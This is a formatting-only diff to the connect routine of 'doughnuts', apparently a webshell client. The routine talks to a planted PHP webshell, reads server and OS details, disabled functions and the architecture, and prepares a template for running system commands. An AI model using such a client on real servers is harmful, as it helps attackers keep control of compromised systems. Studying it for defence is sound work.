@@ -113,7 +113,12 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         string=ascii_letters + digits, offset=randint(32, 62))
     verify_string = randstr(ascii_letters)
 
-    res = send(get_php_version( version_flag_start, version_flag_end, base64_encode(verify_string)),raw = True)
+    res = send(
+        get_php_version(
+            version_flag_start,
+            version_flag_end,
+            base64_encode(verify_string)),
+        raw=True)
 
     if (not res or version_flag_start not in res.r_text):
         print(color.red("Connect failed..."))
@@ -129,10 +134,17 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
     if verify_string not in res.r_text:
         gset("webshell.disable_base64_decode", True, namespace="webshell")
         gset("webshell.base64_en_func", "b64e", namespace="webshell")
-        gset("webshell.base64_de_func", "b64d",namespace = "webshell")
+        gset("webshell.base64_de_func", "b64d", namespace="webshell")
 
     if version_flag_start in res.r_text:  # 验证是否成功连接
-        gset("webshell.php_version", res.r_text.split(version_flag_start + "|")[1].split("|" + version_flag_end)[0], namespace="webshell")
+        gset(
+            "webshell.php_version",
+            res.r_text.split(
+                version_flag_start +
+                "|")[1].split(
+                "|" +
+                version_flag_end)[0],
+            namespace="webshell")
         # 获取总体信息
         info_req = send(get_php_uname(get_ini_value_code()))
         info = info_req.r_text.strip().split("|")
@@ -141,7 +153,11 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         gset("webshell.root", info[0], namespace="webshell")
 
         # 是否为windows
-        gset("webshell.iswin",(True if "win" in info[1].lower() else False),namespace="webshell",)
+        gset(
+            "webshell.iswin",
+            (True if "win" in info[1].lower() else False),
+            namespace="webshell",
+        )
 
         # 服务器版本
         gset("webshell.server_version", info[2], namespace="webshell")
@@ -153,10 +169,14 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         gset("webshell.webshell_root", info[3], namespace="webshell")
 
         # 标识符
-        gset("webshell.prompt",f"doughnuts ({color.cyan(webshell_netloc)}) > ")
+        gset(
+            "webshell.prompt",
+            f"doughnuts ({color.cyan(webshell_netloc)}) > ")
 
         # 初始化执行系统命令模板
-        exec_func = send(get_php_detectd_exec(get_ini_value_code())).r_text.strip()
+        exec_func = send(
+            get_php_detectd_exec(
+                get_ini_value_code())).r_text.strip()
         prepare_system_template(exec_func)
         gset("webshell.exec_func", exec_func, namespace="webshell")
 
@@ -186,7 +206,12 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
             print(color.yellow("detect architecture error\n"))
 
         # 系统版本
-        gset("webshell.os_version", info[1] +" (%d bits)" % bits, namespace="webshell")
+        gset(
+            "webshell.os_version",
+            info[1] +
+            " (%d bits)" %
+            bits,
+            namespace="webshell")
 
         # 系统架构
         gset("webshell.arch", bits, namespace="webshell")
@@ -199,13 +224,19 @@ def run(url: str, method: str = "GET", pwd: str = "pass", *encoders_or_params):
         disable_function_list = [f.strip() for f in info[5].split(",")]
         if ('' in disable_function_list):
             disable_function_list.remove('')
-        gset("webshell.disable_functions", disable_function_list, namespace="webshell")
+        gset(
+            "webshell.disable_functions",
+            disable_function_list,
+            namespace="webshell")
 
         # disable_classes
         disable_classes_list = [f.strip() for f in info[9].split(",")]
         if ('' in disable_classes_list):
             disable_classes_list.remove('')
-        gset("webshell.disable_classes", disable_classes_list, namespace="webshell")
+        gset(
+            "webshell.disable_classes",
+            disable_classes_list,
+            namespace="webshell")
 
         root_path = gget("root_path")
         from_log = gget("webshell.from_log", "webshell")
